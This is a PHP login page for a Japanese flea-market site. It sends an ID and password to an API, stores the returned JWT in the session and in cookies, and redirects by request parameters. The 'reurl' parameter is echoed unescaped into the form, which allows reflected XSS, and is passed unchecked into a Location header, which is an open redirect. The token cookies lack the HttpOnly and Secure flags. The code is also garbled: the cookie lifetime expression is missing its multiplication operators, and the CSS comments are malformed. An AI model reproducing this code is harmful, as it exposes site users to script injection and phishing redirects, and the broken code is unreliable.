
<?php
require '../lib/php-jwt-main/src/JWT.php';
require '../lib/php-jwt-main/src/Key.php';
require '../lib/php-jwt-main/src/SignatureInvalidException.php';
require '../lib/api.php';
require '../lib/locale/ja.php';
require 'error.php';

session_start();
session_unset();
session_destroy();

$msg = " ";
$re_visitorno = "";
$re_pwd = "";

$reurl = "";
if(isset($_GET["reurl"])){
	$reurl = $_GET["reurl"];		

}

?>

<!DOCTYPE html>
<html lang="ja">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">

       <title>サイフル - ケアメンテで確かな仕上がりを約束する安心のフリマサイト</title>
    <meta name="keywords"
        content="apparel, catalog, clean, ecommerce, ecommerce HTML, electronics, fashion, html eCommerce, html store, minimal, multipurpose, multipurpose ecommerce, online store, responsive ecommerce template, shops" />
    <meta name="description" content="Best ecommerce html template for single and multi vendor store.">
    <meta name="author" content="ashishmaraviya">

    <!-- site Favicon -->
    <link rel="icon" href="../assets/images/favicon/favicon.png" sizes="32x32" />
    <link rel="apple-touch-icon" href="../assets/images/favicon/favicon.png" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css" />
    <meta name="msapplication-TileImage" content="../assets/images/favicon/favicon.png" />

    <!-- css Icon Font -->
    <link rel="stylesheet" href="../assets/css/vendor/ecicons.min.css" />

    <!-- css All Plugins Files -->
    <link rel="stylesheet" href="../assets/css/plugins/animate.css" />
    <link rel="stylesheet" href="../assets/css/plugins/swiper-bundle.min.css" />
    <link rel="stylesheet" href="../assets/css/plugins/jquery-ui.min.css" />
    <link rel="stylesheet" href="../assets/css/plugins/countdownTimer.css" />
    <link rel="stylesheet" href="../assets/css/plugins/slick.min.css" />
    <link rel="stylesheet" href="../assets/css/plugins/nouislider.css" />
    <link rel="stylesheet" href="../assets/css/plugins/bootstrap.css" />
    <link rel="stylesheet" href="../assets/css/font-awesome.min.css" />

    <!-- Main Style -->
    <link rel="stylesheet" href="../assets/css/style.css" />
    <link rel="stylesheet" href="../assets/css/responsive.css" />
    <link rel="stylesheet" href="../assets/css/common.css" />

    <!-- Background css -->
    <link rel="stylesheet" id="bg-switcher-css" href="../assets/css/backgrounds/bg-4.css">

    <!-- Screen css -->
    <link rel="stylesheet" href="../assets/css/login.css">
    <script src="//kitchen.juicer.cc/?color=erYShRjbUok=" async></script>
    <style>
    
    html, body {
        overflow-x: hidden;
    }
    body {
        position: relative
    }
    
    ::placeholder {
        / Chrome, Firefox, Opera, Safari 10.1+ /
        color: #DADEDF;
        opacity: 1;
        / Firefox /
    }

    :-ms-input-placeholder {
        / Internet Explorer 10-11 /
        color: #DADEDF;
    }
    </style>
</head>

<body>
    <div id="ec-overlay"><span class="loader_img"></span></div>

    <!-- Header Start  -->
    <div id="header"></div>
    <!-- Header End  -->

    <!-- Ec breadcrumb start -->
    <div class="sticky-header-next-sec  ec-breadcrumb section-space-mb">
        <div class="container">
            <div class="row">
                <div class="col-12">
                    <div class="row ec_breadcrumb_inner">
                        <div class="col-md-6 col-sm-12">
                            <ul class="ec-breadcrumb-list">
                                <li class="ec-breadcrumb-item"><a href="home.php">ホーム</a></li>
                                <li class="ec-breadcrumb-item active">ログイン</li>
                            </ul>
                        </div>
                        <div class="col-md-6 col-sm-12">
                            <h2 class="ec-breadcrumb-title">ログイン</h2>
                        </div>

                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- Ec breadcrumb end -->
    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") // post data in url
    {
        $data_array =  array("visitorno" => $_POST['visitorno'], "password" => $_POST['password']);
        $make_call = callAPI('POST', 'login', json_encode($data_array));
        $response = json_decode($make_call, true);

        if (!$response) {
            $msg = "■ エラーが発生しました。";
        } else {
            //  var_dump($response);
            $check_login = $response['APISTATUS']['status'];
            if ($check_login == 0) //checking login status from server
            {
                $str_token = $response['APISTATUS']['JWTToken'];
                $visitor_no = $response['APISTATUS']['Visitor_no'];
                session_start();
                
                $_SESSION['Login'] = $str_token;
                $_SESSION['Visitor_no'] = $visitor_no;
                $username = $response['APISTATUS']['Visitor_name'];
                $_SESSION['Username'] = $username;
                $nickname = $response['APISTATUS']['nickname'];
                $_SESSION['Nickname'] = $nickname;
                $cookie_name = "Token";
                $cookie_value = $str_token;
                $cookie_vis_name="visitor_no";
                $cookie_vis_no=$visitor_no;
                setcookie($cookie_name, $cookie_value, time() + 60  60  24 * 30, "/"); // 86400 = 1 day
                setcookie($cookie_vis_name, $cookie_vis_no, time() + 60  60  24 * 30, "/"); // 86400 = 1 day

                // print_r($response);
                $url = (isset($_POST["reurl"]))? $_POST["reurl"] : "";
                // echo $url;
                
				if($url){
					header("Location:".$url);

				}
				else{
                    
                    if(is_null($_GET["location"])){
                         header("Location: user-profile.php");
                    }
                    else{
                        
                    if ($_GET["location"] == "productpage") {
                        echo "<script language=javascript> history.go(-2)</script>";
                    } elseif ($_GET["location"] == "notification") {
                        header("Location: notification.php");
                    
                    } elseif ($_GET["location"] == "form") {
                        header("Location: form.php");
                    }
                     elseif ($_GET["location"] == "history") {
                        header("Location: user-history.php");
                    }
                    elseif ($_GET["location"] == "listing") {
                        header("Location: product-listing.php");
                    }
                    elseif ($_GET["location"] == "cart") {
                        header("Location: cart.php");
                    }
                    }            
                }
                
            } else {
                $msg = $response['APISTATUS']['Message'];
            }
        }
    }
    ?>
    <!-- Ec login page -->
    <div class="container">
        <div class="row">
            <div class="ec-login-wrapper">
                <b><span id="errormsg" class="error">
                        <?php if ($msg != "") {
                            echo $msg;
                        } ?>
                </b>
                <div class="ec-login-container">
                    <div class="ec-login-form">
                        <form name="login" id="login" method="POST">
                            <span class="ec-login-wrap">
                                <input type="hidden" name="reurl" id="reurl" value="<?php echo $reurl ?>" />
                                <input type="text" name="visitorno" id="email" value="<?php echo $re_visitorno ?>"
                                    placeholder="ID" required oninvalid="this.setCustomValidity('IDを入力してください。')"
                                    onchange="this.setCustomValidity('')" />
                            </span>
                            <span class="ec-login-wrap">
                                <input type="password" name="password" id="password" value="<?php echo $re_pwd ?>"
                                    placeholder="パスワード" required oninvalid="this.setCustomValidity('パスワードを入力してください。')"
                                    onchange="this.setCustomValidity('')" />
                                <i class="bi bi-eye-slash" id="togglePassword"></i>
                            </span>

                            <span class="ec-login-wrap ec-login-fp" id="reset-pwd-id">
                                <label><a href="reset_password.php"><b>パスワードを忘れた方・変更する方はこちら＞</b></a></label>
                            </span>

                            <span class="ec-login-wrap ec-login-btn" id="login-btn-id">
                                <button class="btn btn-primary login-btn common_btn" value=" ログイン">ログイン
                                </button>
                            </span>
                            <span class="ec-login-wrap" id="register_lbl">
                                <div class="register_msg">
                                    <label class="register_lbl">
                                        <b>はじめてご利用の方 (新規会員登録)</b>
                                    </label>
                                </div>
                                <span><b>サイフルのサービスをご利用になるには会員登録が必要です。</b></span>
                            </span>
                            <span class="ec-login-wrap ec-login-btn" id="register-btn">
                                <a href="register.php" class="btn btn-secondary register_label login-btn common_btn "
                                    style="background-position: right 7px center;">新規会員登録
                                </a>
                            </span>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Footer start -->
    <div id="footer"></div>
    <!-- Footer End -->

    <!-- Cart Floating Button -->
    <div class="ec-cart-float">
        <a href="#ec-side-cart" class="ec-header-btn ec-side-toggle">
            <div class="header-icon"><img src="../assets/images/icons/cart.svg" class="svg_img header_svg" alt="" />
            </div>
            <span class="ec-cart-count cart-count-lable">3</span>
        </a>
    </div>
    <!-- Cart Floating Button end -->

    <!-- Vendor JS -->
    <script src="../assets/js/vendor/jquery-3.5.1.min.js"></script>
    <script src="../assets/js/vendor/popper.min.js"></script>
    <script src="../assets/js/vendor/bootstrap.min.js"></script>
    <script src="../assets/js/vendor/jquery-migrate-3.3.0.min.js"></script>
    <script src="../assets/js/vendor/modernizr-3.11.2.min.js"></script>

    <!--Plugins JS-->
    <script src="../assets/js/plugins/swiper-bundle.min.js"></script>
    <script src="../assets/js/plugins/countdownTimer.min.js"></script>
    <script src="../assets/js/plugins/scrollup.js"></script>
    <script src="../assets/js/plugins/jquery.zoom.min.js"></script>
    <script src="../assets/js/plugins/slick.min.js"></script>
    <script src="../assets/js/plugins/infiniteslidev2.js"></script>
    <script src="../assets/js/vendor/jquery.magnific-popup.min.js"></script>
    <script src="../assets/js/plugins/jquery.sticky-sidebar.js"></script>

    <!-- Main Js -->
    <script src="../assets/js/vendor/index.js"></script>
    <script src="../assets/js/main.js"></script>
    <script src="../assets/js/login.js"></script>
   
</body>

</html>
